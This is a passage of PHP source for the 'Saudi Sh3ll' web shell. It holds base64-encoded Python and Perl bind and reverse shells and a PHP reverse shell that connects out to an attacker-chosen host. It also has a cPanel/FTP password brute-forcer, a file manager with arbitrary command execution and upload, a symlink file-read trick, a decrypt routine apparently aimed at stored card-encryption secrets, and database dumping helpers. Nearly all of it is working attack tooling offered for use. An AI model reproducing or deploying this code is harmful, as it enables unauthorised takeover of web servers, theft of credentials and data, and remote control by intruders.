$bind_py = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";

$back_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
$back_py = "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uIC11DQoNCmltcG9ydCBzeXMsIHNvY2tldCwgb3MNCg0KaWYgbGVuKHN5cy5hcmd2KSAhPSAzOg0KIHByaW50ICJbeF0gVXNvOiAlcyBbaG9zdF0gW3BvcnRdIiAlIChzeXMuYXJndlswXSkNCmVsc2U6DQogaG9zdCA9IHN0cihzeXMuYXJndlsxXSkNCiBwb3J0ID0gaW50KHN5cy5hcmd2WzJdKQ0KIGhhbmRsZXIgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogdHJ5Og0KICB0cnk6DQogICBpZiBvcy5mb3JrKCkgPiAwOiBvcy5fZXhpdCgwKQ0KICBleGNlcHQgT1NFcnJvciwgZXJyb3I6DQogICBwcmludCAnRXJyb3IgRW4gRm9yazogJWQgKCVzKScgJSAoZXJyb3IuZXJybm8sIGVycm9yLnN0cmVycm9yKQ0KICAgcGlkID0gb3MuZm9yaygpDQogICBpZiBwaWQgPiAwOg0KICAgIHByaW50ICdGb3JrIE5vIFZhbGlkbyEnDQogIGhhbmRsZXIuY29ubmVjdCgoaG9zdCwgcG9ydCkpDQogIG9zLmR1cDIoaGFuZGxlci5maWxlbm8oKSwgc3lzLnN0ZGluLmZpbGVubygpKQ0KICBvcy5kdXAyKGhhbmRsZXIuZmlsZW5vKCksIHN5cy5zdGRvdXQuZmlsZW5vKCkpDQogIHdoaWxlIGhhbmRsZXIucmVjdjoNCiAgIGhhbmRsZXIuc2VuZGFsbCgoJ1xuW1NhdWRpIFNoM2xsXSM+JykpDQogICBvcy5zeXN0ZW0oJy9iaW4vYmFzaCcpDQogZXhjZXB0Og0KICBwcmludCAiWyFdIEVycm9yIGNvbm5lY3Rpb24i";

////////////////////////// php ///////////////////////
if ($op == 'php')
{

$sockfd=fsockopen($ip , $port , $errno, $errstr );

 if($errno != 0)
        {
            echo "$errno : $errstr";
        }
        else if (!$sockfd)
        {
               $result = "error connect!</p>";
        }
        else
        {
            fputs ($sockfd ,
            "
/################################\
#                                #
#      Saudi Sh3ll v1.0          #
#                                #
#        by al-swisre            #
#                                #
\################################/");
         $pwd = shell_exec("pwd");
         $sysinfo = shell_exec("uname -a");
         $id = shell_exec("id");
         $len = 1337;
         fputs($sockfd ,$sysinfo . "\n" );
         fputs($sockfd ,$pwd . "\n" );
         fputs($sockfd ,$id ."\n\n" );
         while(!feof($sockfd))
         {
            $cmdPrompt ="(Saudi sh3ll)[$]> ";
            fputs ($sockfd , $cmdPrompt );
            $command= fgets($sockfd, $len);
            fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
         }
         fclose($sockfd);
        }

echo "End Connect";
exit;
}




elseif ($op == 'perl')
{


op_sa("/tmp/sa.pl",$back_perl);
			$out = cmd("perl /tmp/sa.pl ".$ip." ".$port." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre>$out\n".cmd("ps aux | grep sa.pl")."</pre>";
            unlink("/tmp/sa.pl");



}



elseif ($op == 'python')
{


op_sa("/tmp/sa.py",$back_py);
			$out = cmd("python /tmp/sa.py ".$ip." ".$port." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre>$out\n".cmd("ps aux | grep sa.py")."</pre>";




}

}
else if ($_POST['con'] == 'Connect bind'){
/////////////////////// bind /////////////////////

if ($op == 'perl')
{



$bind_port = $_POST['bind_port'];

op_sa("/tmp/sa.pl",$bind_perl);
			$out = cmd("perl /tmp/sa.pl ".$bind_port." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre>$out\n".cmd("ps aux | grep sa.pl")."</pre>";
            unlink("/tmp/sa.pl");



}

else if ($op == 'python')
{


$bind_port = $_POST['bind_port'];

op_sa("/tmp/sa.py",$bind_py);
			$out = cmd("python /tmp/sa.py ".$bind_port." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre>$out\n".cmd("ps aux | grep sa.py")."</pre>";
            unlink("/tmp/sa.py");






}






}}





break;

////////////////////////////////////////// BruteForce  /////////////////////

case 'brt':

echo "<br /><br /><div class='cont3'><a href='$pg?sws=brt'>[ BruteForce ]</a></div><br />";



if (!isset($_POST['bru']))
{

echo '<form method="post">

<textarea name="user" cols="30" rows="15">userlist</textarea>
<textarea name="pass" cols="30" rows="15">passlist</textarea><br /><br />
target : <input type="text" name="trg" value="localhost" />&nbsp;&nbsp;&nbsp;
<select name="op">
<option value="cpanel">cpanel</option>
<option value="ftp">ftp</option>
</select><br /> <br />
<input type="submit" name="bru" value="brute" />
</form>';

exit;
}else
{

$users = $_POST['user'];
$pass = $_POST['pass'];
$option = $_POST['op'];
$connect_timeout=5;
@ini_set('memory_limit', 1000000000000);
$target = $_POST['trg'];
@set_time_limit(0);

$userlist = explode ("\n" , $users );
$passlist = explode ("\n" , $pass );

foreach ($userlist as $user) {
$_user = trim($user);
foreach ($passlist as $password ) {
$_pass = trim($password);
if($option == "ftp"){
ftp_check($target,$_user,$_pass,$connect_timeout);
}
if ($option == "cpanel")
{
cpanel_check($target,$_user,$_pass,$connect_timeout);
}
}
}




}






break;


///////////////////////////////////////////////////// about ///////////////////////////////////////////
case 'ab':

echo '<div class="hedr"> <img src="http://im15.gulfup.com/2012-02-03/1328281037731.png" alt="Saudi Shell" > </div><br /> ';
echo "<div class='ab'><table cellpadding='5'  align='center'>";
echo "<tr><td><b>Coded By :</b> al-swisre</td></tr>";
echo "<tr><td><b>E-mail :</b> oy3@hotmail.com</td></tr>";
echo "<tr><td><b>From :</b> Saudi Arabian</td></tr>";
echo "<tr><td><b>Age :</b> 2/1995</td></tr>";
echo "<tr><td><b>twitter :</b> <a  target='_blank'href='https://twitter.com/#!/al_swisre'>al_swisre</a></td></tr>";
echo "<tr><td><b>S.Greetz 2 :</b> Mr.Alsa3ek - Ejram Hacker</td></tr>";
echo "<tr><td><b>Greetz 2 :</b> e.V.E.L - G-B - kinG oF coNTrol - w0LF Gh4m3D - iNjeCt - abu halil 501 -  Mr.Pixy </td></tr><tr><td><b>And :</b> Mr.Black  - IraQiaN-r0x - Oxygen - locked - n4ss  .. and  All members of v4-team.com </td></tr></div>";

exit;
break;









}








}
else
{
/////////// File Manager //////////////

$sws = 'al-swisre' ;
if ($sws != 'al-swisre'){echo "Coded by al-swisre"; exit;}

if(@$_GET['dir']){
    $dir = $_GET['dir'];
    if($dir != 'nullz') $dir = @cleandir($dir);
}

$curdir = @cleandir(@getcwd());
$self = $_SERVER['PHP_SELF'];
$me = $_SERVER['PHP_SELF'];

if($dir=="") $dir = $curdir;
    $dirx = explode(DIRECTORY_SEPARATOR, $dir);
    $files = array();
    $folders = array();
    echo"<br /><div class='t33p'><table cellpadding='0' align='center' width='100%' >";
    echo"<tr><td style=\"text-align: left\" >";
    echo" Your path : &nbsp;";
    for($i=0;$i<count($dirx);$i++){
        @$totalpath .= $dirx[$i] . DIRECTORY_SEPARATOR;
        echo("<a href='" . $me . "?dir=$totalpath" . "'>$dirx[$i]</a>" . DIRECTORY_SEPARATOR);
    }
    echo "<td></tr></table></div><br />";
    echo"<div class='t3p'><table cellpadding='0' align='center' width='100%' >";
    echo"<tr><td>Name</td><td>Size</td><td>Modify</td><td>Owner/Group</td><td>Permissions</td><td>Option<td></td></tr>";
    if ($handle = @opendir($dir)) {
        while (false != ($link = readdir($handle))) {
               $on3 = @posix_getpwuid(@fileowner($dir."/".$link)) ;
               $gr = @posix_getgrgid(@filegroup($dir."/".$link));
            if (@is_dir($dir . DIRECTORY_SEPARATOR . $link)){
                $file = array();
                @$file['link'] = "<a href='$me?dir=$dir" . DIRECTORY_SEPARATOR . "$link'>[ $link ]</font></a>";
                $file['pir'] = "<a href='?sws=chmod&file=$link&dir=$dir'\">".@wsoPermsColor($dir."/".$link)."</a>";
                $file['pir2'] = "<a href='?sws=chmod&file=$link&dir=$dir'\">".@perm($dir."/".$link)."</a>";

                $folder = "<tr><td> ".$file['link']."</td><td>dir</td><td>".date('Y-m-d H:i:s', @filemtime($dir."/".$link))."</td><td>".$on3['name']."/".$gr['name']."</td><td>".$file['pir']."&nbsp;&nbsp;&nbsp;".$file['pir2']."<td><a href='?sws=rname&file=$link&dir=$dir'\">R</a> - <a href='?sws=chmod&file=$link&dir=$dir'\">C</a> - <a href='?sws=rm&file=$link&dir=$dir'\">rm</a></td></td></tr></div>" ;

                array_push($folders, $folder);
            }
            else{
                $file = array();
                $ext = @strpos($link, ".") ? @strtolower(end(explode(".", $link))) : "";
                 $file['pir'] = "<a href='?sws=chmod&file=$link&dir=$dir'\">".@wsoPermsColor($dir."/".$link)."</a>";
                 $file['pir2'] = "<a href='?sws=chmod&file=$link&dir=$dir'\">".@perm($dir."/".$link)."</a>";
                 $file['size'] = @number_format(@filesize($dir."/".$link)/1024,2);
                   @$file['link'] = "<a href='?sws=edit&file=$link&dir=$dir'\">".$link ."</a>";
                 $file = "<tr><td>".$file['link']."</td><td>".$file['size']."</td><td>".date('Y-m-d H:i:s', @filemtime($dir."/".$link))."</td><td>".$on3['name']."/".$gr['name']."</td><td>".$file['pir']."&nbsp;&nbsp;&nbsp;".$file['pir2']."<td><a href='?sws=edit&file=$link&dir=$dir'\">E</a> - <a href='?sws=rname&file=$link&dir=$dir'\">R</a> - <a href='?sws=chmod&file=$link&dir=$dir'\">C</a> - <a href='?sws=dow&file=$link&dir=$dir'\">D</a> - <a href='?sws=rm&file=$link&dir=$dir'\">rm</a></td></td></tr></div>" ;
                array_push($files, $file);
            }

        }
         asort($folders);
         asort($files);

        foreach($folders as $folder) echo $folder;
       foreach($files as $file) echo $file;
        echo "</table></div>" ;
        closedir($handle);


}














}


if ($_GET['sws'] == 'rname')
{

$dir = $_GET['dir'];

$file = $_GET['file'];

if (!isset($file) or !isset ($dir)){ echo "<br /><br /><a href='$pg'\">[ Back ]</a>"; exit;}

if (!isset($_POST['edit']))
{

echo "<br />
<div class=\"cont3\">  <a href='?sws=edit&file=$file&dir=$dir'\">Edit</a>&nbsp;&nbsp;&nbsp;<a href='?sws=rname&file=$file&dir=$dir'\">Rename</a>&nbsp;&nbsp;<a href='?sws=chmod&file=$file&dir=$dir'\">Chmod</a>&nbsp;&nbsp;<a href='?sws=dow&file=$file&dir=$dir'\">Download</a>
<a href='?sws=rm&file=$file&dir=$dir'\">Delete</a></div><br />
dir : <a href='$pg?dir=".$_GET['dir']."'>".$_GET['dir']."</a>&nbsp;&nbsp;&nbsp; file name : ".$_GET['file']."  <br /> <br />
<form method='post'>
new name : <input type='text' value='$file' name='name'  /><br /><br />
<input type='submit' value='edit' name='edit' />

</form>

 ";
}else
{

$new = $_POST['name'];

$rn = @rename ($dir."/".$file,$dir."/".$new);

if(!$rn)
{


@cmd("cd $dir;mv $file $new ");


}else
{

echo "<br /><br />Name change successfully";

echo "<br /><br /><a href='?sws=rname&file=$new&dir=$dir'\">[ Back ]</a>";

}



}
}





if ($_GET['sws'] == 'chmod')
{

$dir = $_GET['dir'];

$file = $_GET['file'];

if (!isset($file) or !isset($dir)){ echo "<br /><br /><a href='$pg'\">[ Back ]</a>"; exit;}

if (!isset($_POST['edit']))
{

echo "<br />
<div class=\"cont3\">  <a href='?sws=edit&file=$file&dir=$dir'\">Edit</a>&nbsp;&nbsp;&nbsp;<a href='?sws=rname&file=$file&dir=$dir'\">Rename</a>&nbsp;&nbsp;<a href='?sws=chmod&file=$file&dir=$dir'\">Chmod</a>&nbsp;&nbsp;<a href='?sws=dow&file=$file&dir=$dir'\">Download</a>
<a href='?sws=rm&file=$file&dir=$dir'\">Delete</a></div><br />
dir : <a href='$pg?dir=".$_GET['dir']."'>".$_GET['dir']."</a>&nbsp;&nbsp;&nbsp; file name : ".$_GET['file']."  <br /> <br />
<form method='post'>
File to chmod: <input type='text' value=".$dir."/".$file." name='file' />&nbsp;&nbsp;&nbsp;<select name=\"ch\">
<option value=\"755\">755</option>
<option value=\"777\">777</option>
<option value=\"644\">644</option>
</select>
<br /><br /><input type='submit' value='chmod' name='edit' />

</form>

 ";
}
else
{

$pir = $_POST['ch'];

if ($pir == '755'
)

{
   $cd = @chmod($_POST['file'],0775);
}
elseif ($pir == '777')
       {
   $cd = @chmod($_POST['file'],0777);

       }
elseif ($pir == '644')
{

$cd = $cd = @chmod($_POST['file'],0644);

}

if(!$cd)
{
echo "ERROR";

}else
{

echo "changed Successfully";
echo "<br /><br /><a href='?sws=chmod&file=$file&dir=$dir'\">[ Back ]</a>";


}

}
}

if ($_GET['sws'] == 'edit')
{

$file = $_GET['file'];
$dir = $_GET['dir'];

if (!isset($file) or !isset($dir)){ echo "<br /><br /><a href='$pg'\">[ Back ]</a>"; exit;}

if (!isset($_POST['ed']))
{

$fil33 = @fopen($dir."/".$file, 'r');
$content = @fread($fil33, @filesize($dir."/".$file));

echo "
<div class=\"cont3\">  <a href='?sws=edit&file=$file&dir=$dir'\">Edit</a>&nbsp;&nbsp;&nbsp;<a href='?sws=rname&file=$file&dir=$dir'\">Rename</a>&nbsp;&nbsp;<a href='?sws=chmod&file=$file&dir=$dir'\">Chmod</a>&nbsp;&nbsp;<a href='?sws=dow&file=$file&dir=$dir'\">Download</a>
<a href='?sws=rm&file=$file&dir=$dir'\">Delete</a></div>
<br />
dir : <a href='$pg?dir=".$_GET['dir']."'>".$_GET['dir']."</a>&nbsp;&nbsp;&nbsp; file name : ".$_GET['file']."  <br /> <br />
<form method=\"post\">
<br /><textarea cols=\"85\" rows=\"25\" name=\"fil3\">";
echo htmlentities($content) . "\n";
echo '
</textarea>
<br /><br />
<input type="submit" name="ed" value="Save !"/>
</form>

';

}
else
{


$oo = @fopen($dir."/".$file, 'w');
      $ow =   @fwrite($oo, @stripslashes($_POST['fil3']));
        @fclose($oo);
        if (!$ow){echo "Error";}else {
          echo header("Location: ?sws=edit&file=$file&dir=$dir");
          }





}




}
else if ($_GET['sws'] == 'dow')
{
$file = $_GET['file'];
$dir = $_GET['dir'];

@sa_download ($dir."/".$file);


}
/////////////////////////////////////////////////////
if ($_GET['sws'] == 'rm')
{

$dir = $_GET['dir'];

$file = $_GET['file'];

if (!isset($file) or !isset ($dir)){ echo "<br /><br /><a href='$pg'\">[ Back ]</a>"; exit;}

if (!isset($_POST['edit']))
{

echo "<br />
<div class=\"cont3\">  <a href='?sws=edit&file=$file&dir=$dir'\">Edit</a>&nbsp;&nbsp;&nbsp;<a href='?sws=rname&file=$file&dir=$dir'\">Rename</a>&nbsp;&nbsp;<a href='?sws=chmod&file=$file&dir=$dir'\">Chmod</a>&nbsp;&nbsp;<a href='?sws=dow&file=$file&dir=$dir'\">Download</a>
<a href='?sws=rm&file=$file&dir=$dir'\">Delete</a></div>
<br />
dir : <a href='$pg?dir=".$_GET['dir']."'>".$_GET['dir']."</a>&nbsp;&nbsp;&nbsp; file name : ".$_GET['file']."  <br /> <br />
<form method='post'>
<input type='submit' value='Delete' name='edit' />

</form>

 ";
}else
{


$rn = @unlink ($dir."/".$file);

if(!$rn)
{


$rn = @rmdir ($dir."/".$file);



}elseif (!$rn)
{
 $rn =  @cmd("cd $dir;rm $file");

}
else if (!$rn){@cmd ("cd $dir;rm -r $file");}
else{

echo header("Location: $pg?dir=$dir");
}

echo header("Location: $pg?dir=$dir");

}
}
///////////////////////////////////////////////////////////////////////////////// mkdir //////////////////////////////

else if ($_GET['sws'] == 'mkdir')
{


$dir = $_POST['dir'];
$file = $_POST['n4me'];

$mkdir = @mkdir ($dir."/".$file,0755);

if (!$mkdir){@cmd ("mkdir $dir/$file ");}else {header("Location: $pg?dir=$dir"); }
header("Location: $pg?dir=$dir");

}


else if ($_GET['sws'] == 'mkfile')
{

$dir = $_POST['dir'];
$file = $_POST['n4me'];


$mkdir = @fopen($dir."/".$file,'w');

if (!$mkdir){@cmd ("touch $dir/$file ");}else {header("Location: $pg?dir=$dir"); }


}

else if ($_GET['sws'] == 'up')
{


$dir = $_POST['dir'];


if(@move_uploaded_file($_FILES['upfile']['tmp_name'], $dir."/".$_FILES['upfile']['name'])) { header("Location: $pg?dir=$dir"); }
	else { echo '<br /><br />Not uploaded !!<br><br>';exit; }

}


//////////////////////////// read file /////////////////////

else if ($_GET['sws'] == 'rfile')
{



$file = $_POST['n4me'];

echo "dir : <a href='$pg?dir=".$_GET['dir']."'>".$_GET['dir']."</a>&nbsp;&nbsp;&nbsp; file name : ".$_GET['file']."  <br /> <br />  ";

if (!isset($file)){$file = $_GET['dir']."/".$_GET['file'];}

echo "<div>";

$r3ad = @fopen($file, 'r');
if ($r3ad){
$content = @fread($r3ad, @filesize($file));
echo "<pre>".htmlentities($content)."</pre>";
}
else if (!$r3ad)
{
echo "<pre>";
$r3ad = @show_source($file) ;
echo "</pre>";
}
else if (!$r3ad)
{
echo "<pre>";
$r3ad = @highlight_file($file);
echo "</pre>";
}
else if (!$r3ad)
{
echo "<pre>";
$sm = @symlink($file,'sym.txt');


if ($sm){
$r3ad = @fopen('sym.txt', 'r');
$content = @fread($r3ad, @filesize($dir."/".$file));
echo "<pre>".htmlentities($content)."</pre>";
}
}

echo "</div>";

//////////////////////// cmd /////////////////////////////////


}else if ($_GET['sws'] == 'cmd')
{
$cmd = $_POST['n4me'];
$dir = $_POST['dir'];

if (isset($cmd))
{


echo "<br /><textarea cols='65' rows='25' name='fil3'> ";

echo @cmd("cd $dir;$cmd") ;

echo " </textarea>";



}




}
else if ($_GET['sws'] == 'site')
{




$read = @file_get_contents("http://networktools.nl/reverseip/$ips") ;

$sit3 = @findit($read,"<pre>","</pre>");

echo "<br /><div class='site'><pre> ";


echo $sit3;

echo "</pre> </div>";

exit;


}










if(@$_GET['dir']){
    $dir = $_GET['dir'];
    if($dir != 'nullz') $dir = cleandir($dir);
}

echo "

<br /><br />
</div><div class='d0n'>
<br /><br />
<table align=\"center\" cellpadding=\"0\" cellspacing=\"0\" width=\"80%\"   >

<tr><td><form method='GET''>
Change dir : <br />
<input type='text' name='name' value='$dir' size='25' />
<input type='hidden'  name='dir' value='$dir' />

<input type='submit' value='Go' />
</form> </td>

<td style=\"float: left\">  <form method='POST' action='$pg?sws=mkdir' >

Make dir :<br />
<input type='text' name='n4me' size='25' />
<input type='hidden'  name='dir' value='$dir' />
<input type='submit' value='Go' /></div>
</form></td></tr>


<tr><td><form method='post' action='$pg?sws=rfile'>
read file : <br />
<input type='text' name='n4me' size='25' />
<input type='hidden'  name='dir' value='$dir' />
<input type='submit' value='Go' />
</form> </td>


<td style=\"float: left\">  <form method='post'  action='$pg?sws=mkfile' >

Make file :<br />
<div style=\"text-align: right\">
<input type='text' name='n4me' size='25' />
<input type='hidden'  name='dir' value='$dir' />
<input type='submit' value='Go' /></div>
</form></td></tr>


<tr><td><form method='POST' action='$pg?sws=cmd'>
Execute : <br />
<input type='text' name='n4me' size='25' />
<input type='hidden'  name='dir' value='$dir' />
<input type='submit' value='Go' />
</form> </td>
<b></b>


<td style=\"float: left\">
<form method='POST' enctype=\"multipart/form-data\" action='$pg?sws=up' >
Upload file :<br />
<div style=\"text-align: right\">
<input type='file' name='upfile' value='Choose file' size='21' />
<input type='hidden'  name='dir' value='$dir' />
<input type='submit' value='Up' />
</form></td></tr>



</table>
 </div>
";
//////////////////////////////////////// exit :d //////////////////////////























function cmd($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}

function sa($i)
{
return @str_repeat("&nbsp;",$i);
}



function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }

    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }

        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }

    return $out;
}


function _hash ($string)
{
    $hash = (function_exists ('sha1')) ? sha1($string):md5($string);
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

function backup_tables($path,$host,$user,$pass,$name,$tables = '*')
{

  $link = @mysql_connect($host,$user,$pass);
  @mysql_select_db($name,$link);

  //get all of the tables
  if($tables == '*')
  {
    $tables = array();
    $result = @mysql_query('SHOW TABLES');
    while($row = @mysql_fetch_row($result))
    {
      $tables[] = $row[0];
    }
  }
  else
  {
    $tables = is_array($tables) ? $tables : explode(',',$tables);
  }

  //cycle through
  foreach($tables as $table)
  {
    $result = mysql_query('SELECT * FROM '.$table);
    $num_fields = mysql_num_fields($result);

       $row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
       $return.= "\n\n".$row2[1].";\n\n";

    for ($i = 0; $i < $num_fields; $i++)
    {
      while($row = mysql_fetch_row($result))
      {
        $return.= 'INSERT INTO '.$table.' VALUES(';
        for($j=0; $j<$num_fields; $j++)
        {
          $row[$j] = addslashes($row[$j]);
          $row[$j] = ereg_replace("\n","\\n",$row[$j]);
          if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
          if ($j<($num_fields-1)) { $return.= ','; }
        }
        $return.= ");\n";
      }
    }
    $return.="\n\n\n";
  }

  //save file
  $handle = @fopen($path,'w+');
  @fwrite($handle,$return);
  @fclose($handle);
}

function search($string){
    $q = mysql_query("SHOW TABLE STATUS");
    $data = array();
    while($table = mysql_fetch_array($q)){
        $query = "SELECT * FROM $table[Name]";
        $result = mysql_query($query);
        $row = @mysql_fetch_assoc($result);
        if(!$row){
            continue;
        }
        $columns = array_keys($row);
        $data[$table['Name']] = $columns;
    }
    $tables = array();
    foreach($data as $table=>$columns){
        $query = "SELECT * FROM `$table` WHERE ";
        foreach($columns as $key=>$column){
            if($key == 0){
                $query .= "`$column` LIKE '%$string%'";
            }else{
                $query .= " OR `$column` LIKE '%$string%'";
            }
        }
        $query = mysql_query($query);
        $result = mysql_num_rows($query);
        if($result > 0){
            $tables[] = $table;
        }
    }
    $founded = array();
    foreach($tables as $table){
        $columns = $data[$table];
        foreach($columns as $column){
